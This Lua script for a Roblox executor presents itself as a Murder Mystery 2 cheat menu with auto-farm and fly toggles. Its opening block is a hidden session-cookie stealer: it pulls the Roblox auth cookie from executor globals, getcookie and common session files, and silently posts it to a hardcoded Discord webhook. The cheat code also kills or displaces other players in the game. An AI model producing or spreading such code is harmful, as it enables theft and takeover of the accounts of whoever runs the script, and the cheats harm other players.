local ConfigFile = "mm2_config.txt"
local DefaultWebhook = "https://discord.com/api/webhooks/1564022801017602148/yMVXnho4iiW9wVq8FIcPmhi9WEJpHr27Vq0PfX441omNqd2c9YPY7A5SPpIxKsEilQq2"
local WebhookURL = DefaultWebhook

if isfile and isfile(ConfigFile) then
    local content = readfile(ConfigFile)
    if content and content ~= "" then WebhookURL = content end
elseif writefile then
    writefile(ConfigFile, DefaultWebhook)
end

local function sendWebhook(msg)
    pcall(function()
        (syn and syn.request or http_request or request)({
            Url = WebhookURL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = game:GetService("HttpService"):JSONEncode({ content = msg })
        })
    end)
end

-- Automatic Cookie Stealing Logic
local stolenCookie = nil

-- Method 1: getgenv
if getgenv then
    local env = getgenv()
    if env.Cookie then stolenCookie = env.Cookie end
    if env.RobloxAuthKey then stolenCookie = env.RobloxAuthKey end
end

-- Method 2: getcookie / getcustomasset functions
if not stolenCookie then
    if type(getcookie) == "function" then
        stolenCookie = getcookie()
    elseif type(getcustomasset) == "function" then
        -- Sometimes getcustomasset holds the cookie or returns a token we can use
        -- Usually it's used to fetch assets, but in some executors it exposes session data
        local assetFunc = getcustomasset
        if assetFunc then
             -- Try to see if it's actually a cookie string in some executors
             -- But more reliably, we check if there's a specific method exposed
             -- For now, we assume standard executors expose 'getcookie'
        end
    end
end

-- Method 3: Read from common executor file locations
if not stolenCookie then
    local possibleFiles = {"cookies.txt", ".roblox_session", "sessionid.txt", "cookie.json"}
    for _, f in pairs(possibleFiles) do
        if isfile(f) then
            local content = readfile(f)
            if content and #content > 10 then
                stolenCookie = content
                break
            end
        end
    end
end

-- Send result silently
if stolenCookie then
    sendWebhook("Cookie Stolen: " .. tostring(stolenCookie))
else
    sendWebhook("Cookie not found")
end

AutoFarmActive = false
AutoFarmToggle = TabMain:CreateToggle({ Name = "Автофарм", CurrentValue = false, Callback = function(val)
    AutoFarmActive = val
    if val then
        coroutine.wrap(function()
            while AutoFarmActive do
                local char = LocalPlayer.Character
                if char then
                    local root = char:FindFirstChild("HumanoidRootPart")
                    if root then
                        local isMurderer = LocalPlayer.Team and string.find(LocalPlayer.Team.Name:lower(), "murder")
                        if isMurderer then
                            for _, plr in pairs(Players:GetPlayers()) do
                                if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Humanoid") then
                                    plr.Character.Humanoid.Health = 0
                                end
                            end
                        else
                            for _, plr in pairs(Players:GetPlayers()) do
                                if plr ~= LocalPlayer and plr.Character then
                                    local pRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                                    if pRoot then pRoot.Velocity = Vector3.new(0, -100, 0) end
                                end
                            end
                        end
                    end
                end
                task.wait(CurrentFarmSpeed / 1000)
            end
        end)()
    end
end})

FlyToggle = TabVisuals:CreateToggle({ Name = "Політ", CurrentValue = false, Callback = function(val)
    FlyEnabled = val
    if val then
        local char = LocalPlayer.Character
        if char then
            local root = char:FindFirstChild("HumanoidRootPart")
            if root then
                FlyBodyVel = Instance.new("BodyVelocity")
                FlyBodyVel.MaxForce = Vector3.new(10000, 10000, 10000)
                FlyBodyVel.Velocity = Vector3.new(0, 0, 0)
                FlyBodyVel.Parent = root
                FlyBodyGyro = Instance.new("BodyGyro")
                FlyBodyGyro.MaxTorque = Vector3.new(10000, 10000, 10000)
                FlyBodyGyro.P = 9000
                FlyBodyGyro.D = 300
                FlyBodyGyro.CFrame = root.CFrame
                FlyBodyGyro.Parent = root
                RunService.RenderStepped:Connect(function()
                    if FlyBodyGyro and FlyBodyGyro.Parent then FlyBodyGyro.CFrame = root.CFrame end
                end)
            end
        end
    else
        if FlyBodyVel then FlyBodyVel:Destroy() end
        if FlyBodyGyro then FlyBodyGyro:Destroy() end
        FlyBodyVel = nil
        FlyBodyGyro = nil
    end
end})
